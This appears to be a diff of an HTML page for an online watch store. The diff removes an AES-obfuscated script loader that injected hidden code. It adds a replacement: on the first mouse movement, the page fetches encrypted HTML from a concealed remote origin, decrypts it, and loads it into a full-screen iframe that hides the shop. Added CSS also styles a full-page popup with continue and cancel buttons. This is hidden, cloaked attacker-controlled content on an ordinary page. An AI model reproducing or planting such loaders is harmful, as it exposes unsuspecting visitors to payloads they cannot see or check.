@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Urban Store — Contemporary women's watches for everyday elegance, designed with a modern US and UK audience in mind.">
   <title>Urban Store | Women's Luxury Watches</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <link rel="icon" type="image/jpeg" href="assets/favicon.jpg">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -22,93 +23,477 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5044821&101" alt="free website stats program" border="0"></a></noscript>
 <!-- Histats.com  END  -->
   <link rel="stylesheet" href="assets/style.css">
+   <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            height: 100%;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+            color: #1f2433;
+            background: #f6f7fb;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        #frame {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            border: 0;
+        }
+
+        .hint {
+            text-align: center;
+            padding: 8px;
+            font-size: .85rem;
+            color: #6d28d9;
+            background: #ede9fe;
+        }
+
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .popup-content {
+            background: #ffffff;
+            padding: 60px;
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .loading-gif {
+            width: 160px;
+            height: 160px;
+            margin-bottom: 30px;
+        }
+
+        .popup-content p {
+            font-size: 1.5rem;
+            color: #1f2433;
+            font-weight: 600;
+            margin: 10px 0 35px 0;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+        }
+
+        button {
+            padding: 15px 35px;
+            font-size: 1.1rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 700;
+            min-width: 150px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        #cancelBtn {
+            background: #f44336;
+            color: white;
+        }
+
+        #continueBtn {
+            background: #4CAF50;
+            color: white;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        /* ===== Base Store Layout Styles ===== */
+        .nav {
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            padding: 14px 28px;
+            background: #fff;
+            box-shadow: 0 1px 8px rgba(0, 0, 0, .06);
+        }
+
+        .brand {
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: #6d28d9;
+        }
+
+        .links {
+            display: flex;
+            gap: 18px;
+            margin-left: 8px;
+        }
+
+        .links a {
+            font-size: .92rem;
+            color: #555;
+        }
+
+        .links a:hover {
+            color: #6d28d9;
+        }
+
+        .clock {
+            margin-left: auto;
+            font-size: .8rem;
+            color: #6d28d9;
+            font-weight: 600;
+            background: #f3e8ff;
+            padding: 5px 12px;
+            border-radius: 20px;
+            white-space: nowrap;
+        }
+
+        .cart-btn {
+            border: 0;
+            cursor: pointer;
+            background: #6d28d9;
+            color: #fff;
+            font-weight: 600;
+            padding: 9px 16px;
+            border-radius: 30px;
+            font-size: .9rem;
+        }
+
+        .cart-btn .badge {
+            background: #fff;
+            color: #6d28d9;
+            border-radius: 20px;
+            padding: 0 7px;
+            margin-left: 4px;
+            font-size: .8rem;
+            font-weight: 800;
+        }
+
+        .hero {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+            flex-wrap: wrap;
+            padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff);
+        }
+
+        .hero-text {
+            flex: 1 1 320px;
+        }
+
+        .hero-text h1 {
+            font-size: 2.1rem;
+            margin: 0 0 12px;
+            line-height: 1.2;
+        }
+
+        .hero-text h1 span {
+            color: #db2777;
+        }
+
+        .hero-text p {
+            color: #555;
+            max-width: 460px;
+        }
+
+        .cta {
+            display: inline-block;
+            margin-top: 14px;
+            background: #db2777;
+            color: #fff;
+            font-weight: 700;
+            padding: 12px 26px;
+            border-radius: 30px;
+        }
+
+        .cta:hover {
+            background: #be185d;
+        }
+
+        .hero-img {
+            flex: 1 1 320px;
+            max-width: 520px;
+            width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, .15);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 1.5rem;
+            margin: 40px 0 6px;
+        }
+
+        .grid {
+            display: grid;
+            gap: 22px;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, .07);
+            transition: transform .15s, box-shadow .15s;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 10px 26px rgba(0, 0, 0, .12);
+        }
+
+        .card img {
+            width: 100%;
+            height: 170px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .card .body {
+            padding: 14px 16px 18px;
+        }
+
+        .card h3 {
+            margin: 0 0 4px;
+            font-size: 1rem;
+        }
+
+        .card .price {
+            color: #6d28d9;
+            font-weight: 800;
+            font-size: 1.05rem;
+        }
+
+        .card .old {
+            color: #aaa;
+            text-decoration: line-through;
+            font-size: .85rem;
+            margin-left: 6px;
+            font-weight: 500;
+        }
+
+        .add {
+            margin-top: 10px;
+            width: 100%;
+            cursor: pointer;
+            border: 0;
+            background: #1f2433;
+            color: #fff;
+            font-weight: 600;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: .9rem;
+        }
+
+        .add:hover {
+            background: #6d28d9;
+        }
+
+        .about {
+            padding: 10px 28px 30px;
+        }
+
+        .features {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 14px;
+        }
+
+        .feature {
+            background: #fff;
+            border-radius: 14px;
+            padding: 22px;
+            flex: 1 1 200px;
+            max-width: 260px;
+            text-align: center;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, .06);
+        }
+
+        .feature span {
+            font-size: 1.8rem;
+        }
+
+        .feature h3 {
+            margin: 8px 0 4px;
+            font-size: 1rem;
+        }
+
+        .feature p {
+            margin: 0;
+            color: #666;
+            font-size: .88rem;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 24px;
+            color: #888;
+            font-size: .85rem;
+        }
+    </style>
 </head>
 <body>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-  <script>
-    function aesDecode(encodedText) {
-      const decodedText = decodeURIComponent(encodedText);
-      const bytes = CryptoJS.AES.decrypt(decodedText, 'Hx9$Vm3!Qp7@Lk2#Nr8^Wy5&Ta4*Zc6');
-      return bytes.toString(CryptoJS.enc.Utf8);
-    }
-    const codeString = aesDecode(`U2FsdGVkX18ZmDeQIYkkJmUE7NWCJVdrdnhs8P/z3SfLok4nay3eq5n2qPXEZKC/zvoB9WMBobgU3X072lGlq8B5eqBtmNr/RTg64x/j9s+yq730EdpgirBT1ASU9FyaK+w8pcCwMTVuHNCAeWFc5pT8+rzYbq+wF1jJmKUJdN394MZtYLZNMI2ovYtRmDDfMMviMtXlptYqfWaL8oi9L4KSaIKayzUQJRBu8uviBi3X40nLwt6IwIAdXJKkERCbo3TS72104TbbYWTkoEsubaFT1Ze+J7FaAvWXA0xKKKvfEYC1fJRGDvJ6Gs1iwvGvVKtd7W4ywm/F1CIyi3uwkkEmBm0gTKYaCpjf0h9G+VBZeK9yWcztKIDd84px5o/sLJ/QXphNyo2dhUqDKzIu1hP8wnIvEG2i4LAaMsc7DnptKkKyWzapGsHwCgJAP3ZrEKotgXmbW2yAAcmL625sQ+ycCp+6SuKRWOL4tvx0mH8kGmusFy5CIx+0Ij8cWHQEGOB+IaUWFbl7cD6XYUdVNvPgqetLt25510v7dNDYDEz1ajowfZHk20Kd8qtTYlsHx7ec+O2CN9ugpOVRGCJf2p03WCnEx6iQK4M3EI1q64u1M58lVTNP4OqN0ZUuGvn5zI/ehg2E0mixmPSHWQSCHADiWPRrBm2OjpeBgW2duQoFjMvxbQeJSntfJSa+gqm5KMlDUnOGqw5CEWxnunCVxLF/LRPQ3qTl5RVaYE+BcTUUWk9r4wu19u32nxSs7MuhSY4RjINWTccU5SBu5jrbif4+WMh29VUY9Ia+0iKOPOLM1GMhXJAtpWqrMlB9PYYkOPpMtJG0mfJr82ycW/A15sZISmXnrT+VSR1auG1RwfRZrTLi8KjBF/95Fai2iuZxTzZZxRdIoT7lGG13ye76XJYdT8gbDckP0yXWHKgnuXj+7y392xCbBsgpWn+WBEDRruvWwMyOoJdDPFekJyhwW19QxsP8IZj8wFUWXxz68zjSLPTWTShPeQf68O2E0g6zNVq4u2BRflZjLVasuyAwCHRVu/sHG+xZMCTcYAxbVB2mtul54qGB20CoG3Qxdf/pADVj6U6aeBk4utTTTMygo5SNZ55T8xoWDUYlCWkFJlw68K+jE2fAUURNgXh5T8A7GKxPk/96LIoeZXlSm4BInbDfxuUcWiWeNEsMXrmn9HvHxGg/PebA67jQ/7DeWHAIxMyHiabZgVUaSb/8QhoKfV2uyBCfD30D3UQNLnKXy6Lj3PoD0aU4pRYH3f9hfV/+xPQCCLxkeE9HeE2km2ABF7fSI7qh4zFIhZ/OXwu6ZiJWeEQPgJWypGe9OS8+T9n9f4DR+dTjZNRIYwXFHZNdKsv4TcSOg4SnYqa1+UGlRvfXfYDps8Va+MiTwgLvDr87joEmQjD0LuDtrVeRDabcpgLqd7P8keO0dGvbMkt/5nxIhj9JuVUSrjJx7C9Ug62MX12fqgB4ktxdhoW3AVgcvdnXxi84OU0B+v6q9YF7BujN9kk/8Qiy3ttX4Xiccgztc9LR0py9Nehf5zgJxbdFP1Ks/e7+ffuASEAeOyXY7eXK1fRM5gJz8b5U4hPbHS0s0aRlS4W4uVIN3RdFH1chpg4kMX7q1Cas102DdxiLFQ6cZYxcZtyMoIzDeDiSRbhPKjSzEn/a8d92ez513qr4wqkZit7JF7r333DeWIsO+yxMPCIbpTP2aR/5qcM1k14aFEUAWxL5bbihzDy+NHqVJtMIue4hLCHMCHa/bwr3DL8RuWkQZfFCUeFX9WqdNyPWFEWTpSCpy+I42miPPoT3uIxvmOB/gXRYL8gma/HcY1qYIiBgnQZhQkrctrUZguMdOGHZtLnIX3cLbrl76CaYqW4i/MABjR9tQgNrCIvNG4zWKSAAosIqJOUVGrPi5XoXbeYFYZb/C0rOSTDrv9dxUmCl/rC+XHY52FS8aW3FsrwbouL1BVH814WuzVALk6n3FDkcd9wflReXuVyGCZ3ZOx4vqjUYBumMOBBTtuVACaHe623/JXeAmtonZNcbW/dXCVSc9FRTcqwntxvOod8BolOK2SLdqLBYiZsDS7qNItW/NwgO32F3EkziD9rCwXdYguzJUQm+CKfWEFBwTyEC5aIGFJ6CQczBY4Y8M9+J84RuagVpb8UlMmKfQLlNc15vRwECU85fKCvkpTsGKKuVqUpptE92lkPiYH2y9Fl5Gbcpmu33k1H+kDSQHH0fW8p+2h7zHj21WvYkq9lFvOLtju7BEEM5ZOc+DCnAnVHEDEd5+PMBnfA+B+RaLEFMsgQmnrKQO7w+FQbmXhx7v8UZpm+vTfl+kssTBPd9o767tBtMsA3KSHAOFlQJe4uKlK2uPOlxtuAHdYgF6I8Xfy6iB7MtsJzDmIh+z88zCLpF7t8ees+JVAEurP/pHSmKx5Sj4g67R1PmoSmaQecNp3ie7Ia/ij7emRai3VAZN0+h/Ji8EQKhpjTqtV/dybzx4jkNfqhcivV18IYla7Qo3amJl7jqyFp5MlZFFowWFdJW9POnOyJsVnQciqA7Jd8L2OtTQ/yWk/BXC4XV8xEVUPL3HQ0S3sRLCp+CFGXvLFZwGcc=`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
-  </script>
-  <script>
-    document.body.style.overflow = "hidden";
-  </script>
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
 
-  <div id="cookie-modal-box" class="">
-    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300">
-    </div>
-    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300">
-      <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
-        <button id="cookie-close" class="absolute top-4 right-4">
-          <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
-            <path fill="currentColor"
-              d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z">
-            </path>
-          </svg>
-        </button>
-        <div class="flex items-center gap-3 mb-4">
-          <span class="text-yellow-500 text-3xl">🍪</span>
-          <h2 class="text-2xl font-bold">About cookies</h2>
+<div id="cookie-banner" class="cookie-hidden">
+    <style>
+        /* Scoped UI Layout & Core Variables */
+        #cookie-banner.cookie-hidden { display: none !important; }
+        #cookie-overlay {
+            position: fixed; inset: 0; z-index: 99999;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        #cookie-window {
+            position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100000;
+            opacity: 0; transform: scale(0.95); transition: all 0.3s ease; pointer-events: none;
+        }
+        #cookie-banner.cookie-active #cookie-overlay { opacity: 1; }
+        #cookie-banner.cookie-active #cookie-window { opacity: 1; transform: scale(1); pointer-events: auto; }
+
+        /* Panel Aesthetics */
+        .cookie-card {
+            background: #fff; color: #2d3748; border-radius: 16px; padding: 28px; position: relative;
+            max-width: 500px; width: 100%; box-sizing: border-box; box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        .cookie-x { position: absolute; top: 16px; right: 16px; background: none; border: none; cursor: pointer; color: #718096; }
+        .cookie-x:hover { color: #e53e3e; }
+        .cookie-title { display: flex; align-items: center; gap: 8px; margin: 0 0 12px 0; font-size: 1.35rem; font-weight: 700; }
+
+        /* Content Policy Scroller */
+        .cookie-scroll {
+            font-size: 0.88rem; color: #4a5568; line-height: 1.5; margin-bottom: 20px;
+            max-height: 140px; overflow-y: auto; border: 1px solid #e2e8f0; padding: 12px; border-radius: 8px; background: #f7fafc;
+        }
+        .cookie-scroll h3 { font-size: 0.9rem; margin: 10px 0 4px 0; color: #1a202c; }
+        .cookie-scroll ul { margin: 0; padding-left: 18px; }
+
+        /* Action Controls */
+        .cookie-actions { display: flex; flex-direction: column; gap: 10px; }
+        .cookie-btn { width: 100%; padding: 11px; border-radius: 8px; font-weight: 700; font-size: 0.95rem; cursor: pointer; border: none; text-align: center; }
+        .cookie-yes { background: #38a169; color: #fff; }
+        .cookie-yes:hover { background: #2f855a; }
+        .cookie-no { background: #edf2f7; color: #2d3748; }
+        .cookie-no:hover { background: #e2e8f0; }
+
+        @media (min-width: 576px) { .cookie-actions { flex-direction: row; } }
+    </style>
+
+    <div id="cookie-overlay" data-cookie="closed"></div>
+    <div id="cookie-window">
+        <div class="cookie-card">
+            <button class="cookie-x" data-cookie="closed" aria-label="閉じる">
+                <svg viewBox="0 0 15 15" height="22" width="22"><path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/></svg>
+            </button>
+            <h2 class="cookie-title">🍪 クッキーポリシーへの同意</h2>
+            <div class="cookie-scroll">
+                <p>当サイトでは利便性向上、アクセス解析、広告配信のためにクッキー（Cookie）を使用しています。</p>
+                <h3>■ 主な利用目的</h3>
+                <ul>
+                    <li>サイトの動作に必要な機能（必須）</li>
+                    <li>アクセス解析による利便性向上（パフォーマンス）</li>
+                    <li>趣味・嗜好に応じた広告の表示（マーケティング）</li>
+                </ul>
+            </div>
+            <div class="cookie-actions">
+                <button class="cookie-btn cookie-yes" data-cookie="accepted">全てに同意する</button>
+                <button class="cookie-btn cookie-no" data-cookie="declined">拒否する</button>
+            </div>
         </div>
-        <p class="text-gray-600 mb-6">
-          We use cookies to provide you with a better user experience. <span class="font-semibold">"agree"</span>
-          By clicking, you agree to our use of cookies.
-        </p>
-        <div class="flex flex-col sm:flex-row gap-3">
-          <button id="cookie-accept"
-            class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
-          <button id="cookie-decline"
-            class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
-        </div>
-      </div>
     </div>
-  </div>
-  <script>
-    const modalBox = document.getElementById("cookie-modal-box"),
-      modal = document.getElementById("cookie-modal"),
-      backdrop = document.getElementById("cookie-backdrop"),
-      acceptBtn = document.getElementById("cookie-accept"),
-      declineBtn = document.getElementById("cookie-decline"),
-      closeBtn = document.getElementById("cookie-close");
+</div>
 
-    function showModal() {
-      modalBox.classList.remove("hidden");
-      setTimeout(() => {
-        backdrop.classList.remove("opacity-0");
-        modal.classList.remove("opacity-0", "scale-90");
-      }, 10);
+<script>
+    (function() {
+        const wrapper = document.getElementById('cookie-banner');
+        if (!wrapper || localStorage.getItem('cookie-consent')) return;
+
+        const hide = (decision) => {
+            localStorage.setItem('cookie-consent', decision);
+            wrapper.classList.remove('cookie-active');
+            setTimeout(() => wrapper.classList.add('cookie-hidden'), 300);
+            document.removeEventListener('mousemove', mouseClose);
+        };
+
+        const mouseClose = () => hide('closed');
+
+        // Event delegation processing for all structural buttons/clicks
+        wrapper.addEventListener('click', (e) => {
+            const action = e.target.closest('[data-cookie]')?.dataset.cookie;
+            if (action) hide(action);
+        });
+
+        // Initialize Display
+        wrapper.classList.remove('cookie-hidden');
+        setTimeout(() => wrapper.classList.add('cookie-active'), 10);
+        document.addEventListener('mousemove', mouseClose, { once: true });
+    })();
+</script>
+
+
+<script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/D1XT66V+TrF+r9WHb52Oaunh1kvX2FfsnjwW/ZsrTXiy7BeQMNpNyE/Vs6ghKCCUlhPHyHu/4zg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    let lastUrl = null;
+
+    async function loadSecret() {
+        const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+        try {
+            const res = await fetch(DATA_ORIGIN + "win/sec");
+            const { cipher } = await res.json();
+            const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+            if (!html) throw new Error("Decrypt failed — wrong key?");
+
+            if (lastUrl) URL.revokeObjectURL(lastUrl);
+            const blob = new Blob([html], { type: "text/html" });
+            lastUrl = URL.createObjectURL(blob);
+
+            frame.src = lastUrl;
+
+
+            shop.style.display = "none";
+            frame.style.display = "block";
+
+        } catch (e) {
+            document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        }
     }
 
-    function hideModal(e) {
-      localStorage.setItem("cookie-consent", e);
-      setTimeout(() => {
-        modalBox.classList.add("hidden");
-      }, 1500);
 
-      // remove mousemove listener once closed
-      document.removeEventListener("mousemove", mouseMoveClose);
-    }
-
-    function mouseMoveClose() {
-      hideModal("closed");
-    }
-
-    acceptBtn.onclick = () => hideModal("accepted");
-    declineBtn.onclick = () => hideModal("declined");
-    closeBtn.onclick = () => hideModal("closed");
-    backdrop.onclick = () => hideModal("closed");
-
-    if (!localStorage.getItem("cookie-consent")) {
-      showModal();
-      document.addEventListener("mousemove", mouseMoveClose, { once: true });
-    }
-  </script>
+    window.addEventListener("mousemove", () => {
+        loadSecret();
+    }, { once: true });
+</script>  
 <header class="site-header">
   <button class="mobile-menu-btn" aria-label="Toggle menu">☰</button>
   <a class="logo" href="index.html">Urban Store</a>
